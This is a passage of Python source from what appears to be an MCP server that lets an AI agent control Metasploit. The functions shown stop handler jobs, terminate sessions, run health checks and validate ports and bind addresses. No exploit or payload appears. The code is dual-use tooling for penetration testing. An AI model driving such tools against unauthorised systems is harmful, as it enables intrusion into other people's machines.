                "status": "success",
                "message": f"No handler jobs found among {len(jobs)} active job(s)",
                "handlers_killed": 0,
                "total_jobs": len(jobs),
            }

        logger.info(f"Found {len(handler_jobs)} handler job(s) to kill")

        # Kill each handler job
        killed_count = 0
        failed_jobs = []

        for job_id in handler_jobs.keys():
            try:
                logger.info(f"Killing handler job {job_id}...")
                await asyncio.to_thread(lambda jid=job_id: client.jobs.stop(str(jid)))
                killed_count += 1
                logger.info(f"✓ Killed handler job {job_id}")
            except Exception as e:
                logger.warning(f"Failed to kill handler job {job_id}: {e}")
                failed_jobs.append({"job_id": job_id, "error": str(e)})

        # Verify jobs are gone
        await asyncio.sleep(1.0)
        jobs_after = await asyncio.to_thread(lambda: client.jobs.list)

        still_running = []
        for job_id in handler_jobs.keys():
            if job_id in jobs_after:
                still_running.append(job_id)

        if still_running:
            logger.warning(
                f"{len(still_running)} handler job(s) still running after kill attempt: {still_running}"
            )

        result_message = f"Killed {killed_count}/{len(handler_jobs)} handler job(s)"
        if failed_jobs:
            result_message += f", {len(failed_jobs)} failed"
        if still_running:
            result_message += f", {len(still_running)} still running"

        return {
            "status": "success" if killed_count > 0 else "warning",
            "message": result_message,
            "handlers_killed": killed_count,
            "handlers_found": len(handler_jobs),
            "total_jobs": len(jobs),
            "failed": failed_jobs if failed_jobs else [],
            "still_running": still_running if still_running else [],
        }

    except Exception as e:
        logger.exception("Error killing handler jobs")
        return {
            "status": "error",
            "message": f"Error killing handler jobs: {e}",
            "handlers_killed": 0,
        }


@annotated_tool
@dangerous_tool
async def terminate_session(session_id: int, kill_associated_job: bool = True) -> Dict[str, Any]:
    """
    Forcefully terminate a Metasploit session using the session.stop() method.
    Optionally kills the associated handler job to release ports.

    Args:
        session_id: ID of the session to terminate.
        kill_associated_job: If True, also kill the handler job that created this session (default: True).

    Returns:
        Dictionary with status and result message.
    """
    client = get_msf_client()
    session_id_str = str(session_id)
    logger.info(f"Terminating session {session_id} (kill_associated_job={kill_associated_job})")

    # Acquire per-session lock so we don't terminate while a command is running
    session_lock = await _get_session_lock(session_id_str)
    try:
        await asyncio.wait_for(session_lock.acquire(), timeout=SESSION_LOCK_WAIT_TIMEOUT)
    except asyncio.TimeoutError:
        logger.warning(
            f"Session {session_id} is busy (lock held for >{SESSION_LOCK_WAIT_TIMEOUT}s). "
            f"Cannot terminate — agent should retry."
        )
        return {
            "status": "busy",
            "message": (
                f"Session {session_id} is currently in use by another command. "
                f"Waited {SESSION_LOCK_WAIT_TIMEOUT}s. Please retry termination after the command finishes."
            ),
        }

    try:
        # Check if session exists and get session info
        current_sessions = await _list_sessions_str_keys(client)
        if session_id_str not in current_sessions:
            logger.error(f"Session {session_id} not found.")
            await _cleanup_session_lock(session_id_str)
            return {"status": "error", "message": f"Session {session_id} not found."}

        session_info = current_sessions[session_id_str]
        logger.debug(f"Session {session_id} info: {session_info}")

        # Try to find the associated job ID from session info
        # Sessions created by handlers typically have via_exploit and via_payload info
        associated_job_id = None
        if isinstance(session_info, dict):
            # Check if there's a job_id field (not always present)
            associated_job_id = session_info.get("job_id")

        # Get a handle to the session
        session = await _get_session_object_from_map(
            client=client,
            sessions_by_str_id=current_sessions,
            session_id_str=session_id_str,
        )

        # Stop the session
        await asyncio.to_thread(lambda: session.stop())

        # Verify termination
        await asyncio.sleep(1.0)  # Give MSF time to process termination
        current_sessions_after = await _list_sessions_str_keys(client)

        session_terminated = session_id_str not in current_sessions_after
        result_messages = []

        if session_terminated:
            logger.info(f"Successfully terminated session {session_id}")
            result_messages.append(f"Session {session_id} terminated successfully")
            await _cleanup_session_lock(session_id_str)
        else:
            logger.warning(
                f"Session {session_id} still appears in the sessions list after termination attempt."
            )
            result_messages.append(f"Session {session_id} may not have been terminated properly")

        # Kill associated handler job if requested
        jobs_killed = 0
        if kill_associated_job:
            try:
                # Get all active jobs
                jobs = await asyncio.to_thread(lambda: client.jobs.list)
                logger.debug(f"Active jobs: {list(jobs.keys())}")

                # If we have a specific job_id, try to kill it
                if associated_job_id and str(associated_job_id) in jobs:
                    logger.info(
                        f"Killing associated job {associated_job_id} for session {session_id}"
                    )
                    try:
                        await asyncio.to_thread(lambda: client.jobs.stop(str(associated_job_id)))
                        await asyncio.sleep(0.5)  # Give time to stop
                        jobs_killed += 1
                        result_messages.append(f"Killed associated job {associated_job_id}")
                    except Exception as job_e:
                        logger.warning(f"Failed to kill job {associated_job_id}: {job_e}")
                else:
                    # Try to find handler jobs that might be associated
                    # Look for multi/handler jobs (these are typically the listener jobs)
                    for job_id, job_info in jobs.items():
                        if isinstance(job_info, dict):
                            job_name = job_info.get("name", "").lower()
                            # Check if it's a handler job
                            if "exploit/multi/handler" in job_name or "handler" in job_name:
                                logger.info(f"Found potential handler job {job_id}: {job_name}")
                                # Note: We can't easily determine which handler is for which session
                                # So we log it but don't automatically kill it unless we're sure
                                # The user can manually kill all handlers with stop_job or list_listeners

                if jobs_killed > 0:
                    logger.info(f"Killed {jobs_killed} associated job(s)")
                elif associated_job_id is None:
                    logger.debug(
                        f"No specific job_id found for session {session_id}, job may have already stopped"
                    )

            except Exception as job_cleanup_e:
                logger.warning(
                    f"Error during job cleanup for session {session_id}: {job_cleanup_e}"
                )
                result_messages.append(
                    f"Warning: Could not clean up associated jobs: {job_cleanup_e}"
                )

        if session_terminated:
            return {
                "status": "success",
                "message": ". ".join(result_messages) + ".",
                "session_id": session_id,
                "jobs_killed": jobs_killed,
            }
        else:
            return {
                "status": "warning",
                "message": ". ".join(result_messages) + ".",
                "session_id": session_id,
                "jobs_killed": jobs_killed,
            }

    except MsfRpcError as e:
        logger.error(f"MsfRpcError terminating session {session_id}: {e}")
        return {"status": "error", "message": f"Error terminating session {session_id}: {e}"}
    except Exception as e:
        logger.exception(f"Unexpected error terminating session {session_id}")
        return {
            "status": "error",
            "message": f"Unexpected error terminating session {session_id}: {e}",
        }
    finally:
        session_lock.release()


# --- Health Check ---
# Add both MCP tool and HTTP endpoint for health checking


@annotated_tool
async def health_check() -> Dict[str, Any]:
    """Check connectivity to the Metasploit RPC service (MCP tool version)."""
    try:
        client = get_msf_client()  # Will raise ConnectionError if not init
        logger.debug(
            f"Executing health check MSF call (core.version) with {RPC_CALL_TIMEOUT}s timeout..."
        )
        # Use a lightweight call like core.version
        version_info = await asyncio.wait_for(
            asyncio.to_thread(lambda: client.core.version), timeout=RPC_CALL_TIMEOUT
        )
        msf_version = (
            version_info.get("version", "N/A") if isinstance(version_info, dict) else "N/A"
        )
        # Report whether a database is attached so callers know if the workspace
        # intelligence tools (list_hosts/services/vulns/...) are usable.
        try:
            database_connected = await asyncio.wait_for(
                _db_connected(client), timeout=RPC_CALL_TIMEOUT
            )
        except Exception:  # pragma: no cover - db status is best-effort
            database_connected = False
        logger.info(f"Health check successful. MSF Version: {msf_version}")
        return {
            "status": "ok",
            "msf_version": msf_version,
            "database_connected": database_connected,
            "safety": {
                "dangerous_actions_enabled": DANGEROUS_ACTIONS_ENABLED,
                "rate_limit_per_min": RATE_LIMIT_PER_MIN,
            },
        }
    except asyncio.TimeoutError:
        error_msg = (
            f"Health check timeout ({RPC_CALL_TIMEOUT}s) - Metasploit server is not responding"
        )
        logger.error(error_msg)
        return {"status": "error", "message": error_msg}
    except (MsfRpcError, ConnectionError) as e:
        logger.error(f"Health check failed - MSF RPC connection error: {e}")
        return {"status": "error", "message": f"Metasploit Service Unavailable: {e}"}
    except Exception as e:
        logger.exception("Unexpected error during health check.")
        return {"status": "error", "message": f"Internal Server Error during health check: {e}"}


# HTTP Health Check Endpoint
from starlette.requests import Request
from starlette.responses import JSONResponse


@mcp.custom_route("/health", methods=["GET"])
async def http_health_endpoint(request: Request) -> JSONResponse:
    """HTTP health check endpoint for Docker and monitoring systems"""
    try:
        client = get_msf_client()
        logger.debug("HTTP health check: Testing MSF RPC connection...")

        # Use a lightweight call like core.version
        version_info = await asyncio.wait_for(
            asyncio.to_thread(lambda: client.core.version), timeout=RPC_CALL_TIMEOUT
        )

        msf_version = (
            version_info.get("version", "N/A") if isinstance(version_info, dict) else "N/A"
        )
        logger.debug(f"HTTP health check successful. MSF Version: {msf_version}")

        return JSONResponse(
            {
                "status": "healthy",
                "service": "MetasploitMCP",
                "msf_version": msf_version,
                "msf_server": f"{MSF_SERVER}:{MSF_PORT_STR}",
                "ssl": MSF_SSL_STR == "true",
            },
            status_code=200,
        )

    except asyncio.TimeoutError:
        error_msg = (
            f"Health check timeout ({RPC_CALL_TIMEOUT}s) - Metasploit server is not responding"
        )
        logger.error(error_msg)
        return JSONResponse(
            {"status": "unhealthy", "service": "MetasploitMCP", "error": error_msg}, status_code=503
        )

    except (MsfRpcError, ConnectionError) as e:
        logger.error(f"HTTP health check failed - MSF RPC connection error: {e}")
        return JSONResponse(
            {
                "status": "unhealthy",
                "service": "MetasploitMCP",
                "error": f"Metasploit Service Unavailable: {str(e)}",
            },
            status_code=503,
        )

    except Exception as e:
        logger.exception("Unexpected error during HTTP health check")
        return JSONResponse(
            {
                "status": "unhealthy",
                "service": "MetasploitMCP",
                "error": f"Internal Server Error: {str(e)}",
            },
            status_code=500,
        )


@mcp.custom_route("/", methods=["GET"])
async def http_root_endpoint(request: Request) -> JSONResponse:
    """Root endpoint with service information"""
    return JSONResponse(
        {
            "service": "MetasploitMCP",
            "version": "2.0.0",
            "description": "Metasploit Framework MCP Server",
            "mcp_endpoint": "/mcp",
            "health_endpoint": "/health",
            "status": "running",
            "msf_server": f"{MSF_SERVER}:{MSF_PORT_STR}",
        }
    )


# --- Server Startup Logic ---


async def check_port_available(port: int, host: str = "0.0.0.0") -> Tuple[bool, str]:
    """
    Check if a port is available to bind to.

    Args:
        port: Port number to check
        host: Host/interface to check (default: 0.0.0.0 for all interfaces)

    Returns:
        Tuple of (is_available, error_message). If available, error_message is empty.
    """
    if not (1 <= port <= 65535):
        return False, f"Invalid port {port}. Must be between 1 and 65535."

    # First, check all connections using psutil to detect all connection states
    # (LISTEN, ESTABLISHED, TIME_WAIT, CLOSE_WAIT, etc.)
    # Run psutil in executor as it can be slow
    loop = asyncio.get_event_loop()
    try:
        connections = await loop.run_in_executor(None, psutil.net_connections, "inet")
        for conn in connections:
            if conn.laddr and conn.laddr.port == port:
                # Port is in use (any state: LISTEN, ESTABLISHED, etc.)
                logger.debug(
                    f"Port {port} in use by connection: {conn.status} "
                    f"local={conn.laddr} remote={conn.raddr}"
                )
                return (
                    False,
                    f"Port {port} is already in use by connection: {conn.status} local={conn.laddr} remote={conn.raddr}",
                )
    except (psutil.AccessDenied, psutil.NoSuchProcess, OSError) as e:
        # If psutil fails (permission issues), fall through to socket check
        logger.warning(f"psutil check failed for port {port}: {e}, falling back to socket check")

    # Run blocking socket operations in executor to avoid blocking event loop
    def _check_socket_bind():
        try:
            # Try to bind to the port
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind((host, port))
                logger.debug(f"Port {port} on {host} is available.")
                return True, ""
        except socket.error as e:
            error_msg = f"Port {port} is already in use on {host}. Please choose a different port or stop the service using this port."
            logger.warning(error_msg)
            return False, error_msg
        except Exception as e:
            error_msg = f"Error checking port {port} availability: {e}"
            logger.error(error_msg)
            return False, error_msg

    try:
        return await loop.run_in_executor(None, _check_socket_bind)
    except Exception as e:
        error_msg = f"Error checking port {port} availability: {e}"
        logger.error(error_msg)
        return False, error_msg


def find_available_port(start_port, host="127.0.0.1", max_attempts=10):
    """Finds an available TCP port."""
    for port in range(start_port, start_port + max_attempts):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind((host, port))
                logger.debug(f"Port {port} on {host} is available.")
                return port
            except socket.error:
                logger.debug(f"Port {port} on {host} is in use, trying next.")
                continue
    logger.warning(
        f"Could not find available port in range {start_port}-{start_port+max_attempts-1} on {host}. Using default {start_port}."
    )
    return start_port


def get_local_ip_addresses() -> List[str]:
    """
    Get all configured IP addresses on the local machine.
    Returns a list of IP address strings (both IPv4 and IPv6).
    """
    ip_addresses = []

    try:
        # Get all network interfaces and their addresses
        import socket

        # Method 1: Use socket.getaddrinfo to get local addresses
        # This gets the hostname and resolves all its addresses
        hostname = socket.gethostname()
        try:
            for info in socket.getaddrinfo(hostname, None):
                addr = info[4][0]
                if addr not in ip_addresses:
                    ip_addresses.append(addr)
        except socket.gaierror:
            logger.debug("Could not resolve hostname addresses")

        # Method 2: Try to connect to a remote address to discover local IPs
        # This helps find the actual routable local IPs
        test_addresses = [
            ("8.8.8.8", 80),  # Google DNS (IPv4)
            ("2001:4860:4860::8888", 80),  # Google DNS (IPv6)
        ]

        for test_addr, test_port in test_addresses:
            try:
                with socket.socket(
                    socket.AF_INET6 if ":" in test_addr else socket.AF_INET, socket.SOCK_DGRAM
                ) as s:
                    s.connect((test_addr, test_port))
                    local_addr = s.getsockname()[0]
                    if local_addr not in ip_addresses:
                        ip_addresses.append(local_addr)
            except (socket.error, OSError):
                continue

        # Always include loopback addresses
        loopback_addresses = ["127.0.0.1", "::1"]
        for addr in loopback_addresses:
            if addr not in ip_addresses:
                ip_addresses.append(addr)

        logger.debug(f"Discovered local IP addresses: {ip_addresses}")
        return ip_addresses

    except Exception as e:
        logger.warning(f"Error discovering local IP addresses: {e}")
        # Fallback to basic loopback addresses
        return ["127.0.0.1", "::1"]


def _validate_bind_address_sync(bind_address: str) -> Tuple[bool, str]:
    """
    Synchronous implementation of bind address validation.
    This does socket operations and should be called via asyncio.to_thread().

    Args:
        bind_address: The IP address to validate

    Returns:
        Tuple of (is_valid, error_message). If valid, error_message is empty.
    """
    if not bind_address:
        return False, "Bind address cannot be empty"

    try:
        # Parse the address to ensure it's a valid IP
        addr_obj = ipaddress.ip_address(bind_address)

        # Check if it's a wildcard address (0.0.0.0 or ::)
        if addr_obj.is_unspecified:
            return True, ""

        # Get all local IP addresses (this does socket operations)
        local_ips = get_local_ip_addresses()

        # Check if the bind address is one of the local IPs
        if bind_address in local_ips:
            return True, ""

        # If we get here, it's not a wildcard and not a local IP
        return False, (
            f"Bind address '{bind_address}' is not a wildcard address (0.0.0.0 or ::) "
            f"and is not configured on this machine. Available addresses: {', '.join(local_ips)}"
        )

    except ValueError as e:
        return False, f"Invalid IP address format: {bind_address} ({e})"


async def validate_bind_address(bind_address: str) -> Tuple[bool, str]:
    """
    Validate that a bind address is either a wildcard address or a configured local IP.
    This is an async function that runs the validation in a thread pool to avoid
    blocking the event loop during socket operations.

    Args:
        bind_address: The IP address to validate

    Returns:
        Tuple of (is_valid, error_message). If valid, error_message is empty.
    """
    return await asyncio.to_thread(_validate_bind_address_sync, bind_address)


if __name__ == "__main__":
    from . import main

    main()
